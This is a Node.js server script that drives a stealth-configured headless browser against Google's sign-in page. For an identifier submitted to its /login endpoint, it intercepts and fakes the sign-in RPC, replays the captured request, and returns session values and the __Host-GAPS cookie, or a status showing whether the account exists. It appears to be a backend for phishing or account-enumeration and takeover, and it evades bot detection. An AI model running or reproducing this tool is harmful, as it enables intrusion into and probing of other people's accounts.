const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const puppeteer = require('puppeteer-extra')
const bodyParser = require('body-parser')
const express = require('express')
const axios = require('axios')
require('dotenv').config()

let page = null
let mLoaded = false
let mUrl = null
let mPostData = null
let mHeaders = null
let mIp = ''

const app = express()

app.use(express.json())
app.use(bodyParser.urlencoded({ extended: true }))

puppeteer.use(StealthPlugin())

app.listen(process.env.PORT || 3000, ()=>{
    console.log('Listening on port 3000...')
})

startBrowser()

setInterval(async () => {
    mLoaded = false
    console.log('Page Reloading...')
    await loadLoginPage()
    console.log('Page Reload Success')
    mLoaded = true
}, 15*60*1000)


app.post('/login', async (req, res) => {
    if (req.body) {
        let number = req.body.number
        if (number) {
            if (mLoaded) {
                let mData = await getLoginToken(number)
                res.end(JSON.stringify(mData))
            } else {
                await delay(5000)
                res.end(JSON.stringify({ status:-1 }))
            }
        } else {
            res.end(JSON.stringify({ status:-1 }))
        }
    } else {
        res.end(JSON.stringify({ status:-1 }))
    }
})

app.get('/login', async (req, res) => {
    if (req.query) {
        let number = req.query.number
        if (number) {
            if (mLoaded) {
                let mData = await getLoginToken(number)
                res.end(JSON.stringify(mData))
            } else {
                await delay(5000)
                res.end(JSON.stringify({ status:-1 }))
            }
        } else {
            res.end(JSON.stringify({ status:-1 }))
        }
    } else {
        res.end(JSON.stringify({ status:-1 }))
    }
})

app.get('/ip', async (req, res) => {
    res.end(mIp)
})

app.get('/', async (req, res) => {
    res.end('Fuck You')
})


async function startBrowser() {
    mIp = await getIpAdress()

    console.log('Ip: '+mIp)

    try {
        let browser = await puppeteer.launch({
            headless: false,
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-notifications',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage'
            ],
            executablePath: process.env.NODE_ENV == 'production' ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath()
        })

        page = (await browser.pages())[0]

        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

        await page.setRequestInterception(true)

        page.on('request', request => {
            try {
                if (request.url().startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe')) {
                    mUrl = request.url()
                    mHeaders = request.headers()
                    mPostData = request.postData()
                    let contentType = 'application/json; charset=utf-8'
                    let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')

                    request.respond({
                        ok: true,
                        status: 200,
                        contentType,
                        body: output,
                    })
                } else {
                    request.continue()
                }
            } catch (error) {
                request.continue()
            }
        })

        console.log('Browser Load Success')

        await loadLoginPage()

        mLoaded = true

        console.log('Page Load Success')
    } catch (error) {
        console.log('Browser Error: '+error)
    }
}


async function getLoginToken(number) {
    try {
        await loadingRemove()
        mUrl = null
        mHeaders = null
        mPostData = null
        await page.evaluate((number) => {
            document.querySelector('input#identifierId').value = number
            document.querySelector('#identifierNext').click()
        }, number)
        await loadingRemove()
        let url = null
        let headers = null
        let postData = null
        for (let i = 0; i < 30; i++) {
            if (mUrl && mPostData && mHeaders) {
                url = mUrl
                headers = mHeaders
                postData = mPostData
                break
            }
            await delay(500)
        }
        mUrl = null
        mHeaders = null
        mPostData = null
        await loadingRemove()
        
        if (url && postData && headers) {
            let response = await axios.post(url, postData, {
                headers: headers,
                maxRedirects: 0,
                validateStatus: null
            })
            let data = response.data
            let temp = data.substring(data.indexOf('[['), data.lastIndexOf(']]')-2)
            temp = temp.substring(0, temp.lastIndexOf(']]')+2)

            let json = JSON.parse(temp)[0]
            if (json[1] == 'V1UmUe') {
                let value = JSON.parse(json[2])
                if (value[21]) {
                    let info = value[21][1][0][1]
                    return { status:1, tl:info[1][1], cid:info[0][1], host: getHostGaps(headers.cookie) }
                } else if (value[18] && value[18][0]) {
                    return { status:3 }
                } else {
                    return { status:2 }
                }
            }
        }
    } catch (error) {}

    return { status:0 }
}

async function loadingRemove() {
    await page.evaluate(() => {
        let root = document.querySelector('div[class="kPY6ve"]')
        if (root) {
            root.remove()
        }
        root = document.querySelector('div[class="Ih3FE"]')
        if (root) {
            root.remove()
        }
    })
}


async function loadLoginPage() {
    for (let i = 0; i < 3; i++) {
        try {
            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { waitUntil: 'load', timeout: 0 })
            await delay(500)
            break
        } catch (error) {}
    }
}

async function getIpAdress() {
    try {
        let response = await axios.get('https://ifconfig.me/ip')
        let data = response.data
        if (data) {
            return data
        }
    } catch (error) {}

    return ''
}

function getHostGaps(cookies) {
    try {
        if (cookies.includes('__Host-GAPS')) {
            let temp = cookies.substring(cookies.indexOf('__Host-GAPS=')+12, cookies.length)
            if (temp.includes(';')) {
                return temp.substring(0, temp.indexOf(';'))
            }
            return temp
        }
    } catch (error) {}

    return null
}

function decode(text) {
    return Buffer.from(text, 'base64').toString('ascii')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
